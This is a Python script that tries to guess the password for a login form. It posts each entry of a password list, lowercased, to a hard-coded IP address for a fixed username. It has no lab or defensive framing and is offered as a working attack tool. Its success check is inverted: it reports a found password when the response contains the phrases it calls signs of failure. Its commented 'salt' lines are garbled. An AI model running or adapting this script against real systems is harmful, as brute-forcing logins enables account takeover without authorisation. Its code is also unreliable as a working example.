import requests
import os
import random
import string
import json

target_url = 'http://83.160.88.114:8080'
target_username = 'user'
if_contains_then_invalid = ['not permission', 'is_invalid']

def post_it(password):

    password = password.lower()
    
    # password = string.ascii_letters + string.digits
    # password = (os.urandom(1024))
    # password = password.join(random.choice(string.digits)) // Salt
    # password = password.join(random.choice(chars) for i in range(8))

    response = requests.post(target_url, allow_redirects=False, data={
    	'username': target_username, # 'username-element-name': 'entered-target-username'
    	'password': password, # 'password-element-name': 'password-from-json'
        'Submit': "submit"
    })
    
    print('testing password '+password+' on '+target_username)
    if any(if_contain_then_invalid in str(response.content) for if_contain_then_invalid in if_contains_then_invalid):
        print("[+] {}s password is {}".format(target_username, password))
        exit(0)

if __name__ == "__main__":
    passwords = json.loads(open('password.json').read())
    for password in passwords:
      post_it(password)
